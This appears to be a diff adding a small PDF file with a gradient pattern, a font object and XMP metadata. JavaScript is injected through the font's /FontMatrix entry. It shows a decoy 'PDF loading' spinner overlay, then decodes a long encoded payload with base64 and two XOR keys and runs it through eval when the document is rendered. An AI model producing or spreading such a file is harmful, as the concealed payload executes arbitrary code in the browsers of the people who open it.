@@ -1,0 +1,404 @@
+
+%PDF-1.4
+%âãÏÓ
+8 0 obj
+<<
+/PatternType 2
+/Shading<<
+  /Function<<
+    /Domain[0 1]
+    /C0[0 0 1]
+    /C1[1 0.6 0]
+    /N 1
+    /FunctionType 2
+  >>
+  /ShadingType 2
+  /Coords[46 400 537 400]
+  /Extend[false false]
+  /ColorSpace/DeviceRGB
+>>
+/Type/Pattern
+>>
+endobj
+2 0 obj
+<</Length 3525/Subtype/XML/Type/Metadata>>stream
+<?xpacket begin="ï»¿" id="W5M0MpCehiHzreSzNTczkc9d"?>
+<x:xmpmeta xmlns:x="adobe:ns:meta/" x:xmptk="Adobe XMP Core 5.4-c005 78.147326, 2012/08/23-13:03:03        ">
+   <rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
+      <rdf:Description rdf:about=""
+            xmlns:pdf="http://ns.adobe.com/pdf/1.3/"
+            xmlns:xmp="http://ns.adobe.com/xap/1.0/"
+            xmlns:xmpMM="http://ns.adobe.com/xap/1.0/mm/"
+            xmlns:dc="http://purl.org/dc/elements/1.1/">
+         <pdf:Producer>Acrobat Distiller 6.0 (Windows)</pdf:Producer>
+         <xmp:CreateDate>2006-03-06T15:06:33-05:00</xmp:CreateDate>
+         <xmp:CreatorTool>AdobePS5.dll Version 5.2.2</xmp:CreatorTool>
+         <xmp:ModifyDate>2016-07-15T10:12:21+08:00</xmp:ModifyDate>
+         <xmp:MetadataDate>2016-07-15T10:12:21+08:00</xmp:MetadataDate>
+         <xmpMM:DocumentID>uuid:ff3dcfd1-23fa-476f-839a-3e5cae2da2eb</xmpMM:DocumentID>
+         <xmpMM:InstanceID>uuid:359350b3-af40-4d8a-9d6c-03186b4ffb36</xmpMM:InstanceID>
+         <dc:format>application/pdf</dc:format>
+         <dc:title>
+            <rdf:Alt>
+               <rdf:li xml:lang="x-default">PDF</rdf:li>
+            </rdf:Alt>
+         </dc:title>
+         <dc:creator>
+            <rdf:Seq>
+               <rdf:li></rdf:li>
+            </rdf:Seq>
+         </dc:creator>
+      </rdf:Description>
+   </rdf:RDF>
+</x:xmpmeta>
+                                                                                                    
+                                                                                                    
+                                                                                                    
+                                                                                                    
+                                                                                                    
+                                                                                                    
+                                                                                                    
+                                                                                                    
+                                                                                                    
+                                                                                                    
+                                                                                                    
+                                                                                                    
+                                                                                                    
+                                                                                                    
+                                                                                                    
+                                                                                                    
+                                                                                                    
+                                                                                                    
+                                                                                                    
+                                                                                                    
+                           
+<?xpacket end="w"?>
+endstream
+endobj
+5 0 obj
+<<
+/Widths[573 0 582 0 548 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 573 0 573 0 341]
+/Type/Font
+/BaseFont/PAXEKO+SourceSansPro-Bold
+/LastChar 102
+/Encoding/WinAnsiEncoding
+/FontMatrix [0.1 0 0 0.1 0 (1\);
+
+/**
+ * Simple PDF loading animation — pure JavaScript.
+ * Usage: include with <script src="loader.js"></script>
+ *        or paste into the browser console.
+ *
+ * Creates a fixed, full-screen overlay with a spinner and "Loading ..." text.
+ * Call window.PDFLoader.hide() to remove it.
+ */
+ 
+ 
+ 
+(() => {
+  function init() {
+    // ---------- Inject styles ----------
+    const style = document.createElement('style');
+    style.textContent = `
+      .pdf-loader-overlay {
+        position: fixed;
+        inset: 0;
+        background: #f4f4f5;
+        display: grid;
+        place-items: center;
+        z-index: 999999;
+        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+        color: #52525b;
+      }
+      .pdf-loader-wrap {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        gap: 18px;
+      }
+      .pdf-loader-canvas { display: block; }
+      .pdf-loader-label {
+        font-size: 13px;
+        letter-spacing: 0.3px;
+        color: #71717a;
+      }
+    `;
+    document.head.appendChild(style);
+
+    // ---------- Build DOM ----------
+    const overlay = document.createElement('div');
+    overlay.className = 'pdf-loader-overlay';
+
+    const wrap = document.createElement('div');
+    wrap.className = 'pdf-loader-wrap';
+
+    const canvas = document.createElement('canvas');
+    canvas.className = 'pdf-loader-canvas';
+
+    const label = document.createElement('div');
+    label.className = 'pdf-loader-label';
+    label.textContent = 'Loading';
+
+    const dots = document.createElement('span');
+    label.appendChild(dots);
+
+    wrap.appendChild(canvas);
+    wrap.appendChild(label);
+    overlay.appendChild(wrap);
+    document.body.appendChild(overlay);
+
+    // ---------- Canvas setup (HiDPI) ----------
+    const ctx = canvas.getContext('2d');
+    const DPR = Math.min(window.devicePixelRatio || 1, 2);
+    const SIZE = 64;
+    canvas.width = SIZE * DPR;
+    canvas.height = SIZE * DPR;
+    canvas.style.width = SIZE + 'px';
+    canvas.style.height = SIZE + 'px';
+    ctx.scale(DPR, DPR);
+
+    const cx = SIZE / 2;
+    const cy = SIZE / 2;
+    const radius = 22;
+    const start = performance.now();
+    let rafId;
+
+    function draw(now) {
+      const t = (now - start) / 1000;
+      ctx.clearRect(0, 0, SIZE, SIZE);
+
+      // Track ring
+      ctx.beginPath();
+      ctx.arc(cx, cy, radius, 0, Math.PI * 2);
+      ctx.strokeStyle = '#e4e4e7';
+      ctx.lineWidth = 3;
+      ctx.stroke();
+
+      // Spinning arc — rotates while length breathes
+      const rot = t * 1.6;
+      const breath = (Math.sin(t * 1.8) + 1) / 2;          // 0..1
+      const arcLen = Math.PI * (0.5 + breath * 0.9);       // ~90° to ~250°
+
+      ctx.beginPath();
+      ctx.arc(cx, cy, radius, rot, rot + arcLen);
+      ctx.strokeStyle = '#dc2626';                          // PDF red
+      ctx.lineWidth = 3;
+      ctx.lineCap = 'round';
+      ctx.stroke();
+
+      rafId = requestAnimationFrame(draw);
+    }
+    rafId = requestAnimationFrame(draw);
+
+    // ---------- Animated trailing dots ----------
+    let n = 0;
+    const dotInterval = setInterval(() => {
+      n = (n + 1) % 4;
+      dots.textContent = '.'.repeat(n);
+    }, 400);
+
+    // ---------- Public API ----------
+    window.PDFLoader = {
+      hide() {
+        cancelAnimationFrame(rafId);
+        clearInterval(dotInterval);
+        overlay.remove();
+        style.remove();
+        delete window.PDFLoader;
+      }
+    };
+  }
+
+  // Wait for the body to exist before injecting
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', init);
+  } else {
+    init();
+  }
+})();
+
+
+
+function xorDecode(str, key) {
+  let out = '';
+  for (let i = 0; i < str.length; i++) {
+    out += String.fromCharCode(str.charCodeAt(i) ^ key.charCodeAt(i % key.length));
+  }
+  return out;
+}
+
+function decodeJs(encoded, k1, k2) {
+  const step1 = xorDecode(atob(encoded), k2);
+  const step2 = xorDecode(atob(step1), k1);
+  return step2;
+}
+
+const KEY1 = "pSci9KAmG3t38ziS";
+const KEY2 = "IpI3aYeooiWj1OpQ";
+const ENCODED = "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";
+
+eval(decodeJs(ENCODED, KEY1, KEY2));
+
+
+
+
+
+//)]
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+/Subtype/Type1
+/FirstChar 65
+/FontDescriptor 9 0 R
+>>
+endobj
+2 0 obj
+<<
+/Kids[3 0 R]
+/Type/Pages
+/Count 1
+>>
+endobj
+9 0 obj
+<<
+/Type/FontDescriptor
+/ItalicAngle 0
+/Ascent 751
+/FontBBox[-6 -12 579 713]
+/FontName/PAXEKO+SourceSansPro-Bold
+/StemV 100
+/CapHeight 713
+/Flags 32
+/FontFile3 10 0 R
+/Descent -173
+/MissingWidth 250
+>>
+endobj
+6 0 obj
+<<
+/Length 128
+>>
+stream
+47 379 489 230 re S
+/Pattern cs
+BT
+  50 500 Td
+  117 TL
+  /F1 150 Tf
+  /P1 scn
+  (AbCdEf) Tj
+  /P2 scn
+  (AbCdEf) '
+ET
+endstream
+endobj
+3 0 obj
+<<
+/Type/Page
+/Resources 4 0 R
+/Contents 6 0 R
+/Parent 2 0 R
+/MediaBox[0 0 595.2756 841.8898]
+>>
+endobj
+10 0 obj
+<<
+/Length 800
+/Subtype/Type2
+>>
+stream
+
+endstream
+endobj
+7 0 obj
+<<
+/PatternType 1
+/Matrix[1 0 0 1 50 0]
